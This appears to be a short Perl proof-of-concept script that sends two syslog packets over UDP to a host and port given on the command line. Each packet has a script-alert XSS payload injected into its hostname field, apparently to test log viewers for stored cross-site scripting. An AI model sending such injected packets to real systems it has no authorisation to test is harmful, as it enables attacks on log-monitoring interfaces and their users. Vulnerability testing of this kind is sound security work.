#!/usr/bin/perl
use IO::Socket::INET;
$|=1;

$host=shift;
$port=shift;

if(defined($host) && defined($port)){
        ;
}else{
        die "usage: $0 host port\n";
}

$con=new IO::Socket::INET->new(PeerPort=>$port,
        Proto=>'udp',
        PeerAddr=>$host);

$npriority = '<0>';
$nhostname = "www.example.com";
$npid = 'test[10]';
$nmsg = "testing by demonalex";

$testcase1="<script>alert(\"XSS1\")</script>";
$testcase2="<script>alert(/XSS2/)</script>";

#testcase1
$header = $testcase1.' '.$nhostname.' '.$npid;
$packet = $npriority.$header.': '.$nmsg;
$con->send($packet);

#testcase2
$header = $testcase2.' '.$nhostname.' '.$npid;
$packet = $npriority.$header.': '.$nmsg;
$con->send($packet);

$con->close;

print "Over!\n";

exit(1);
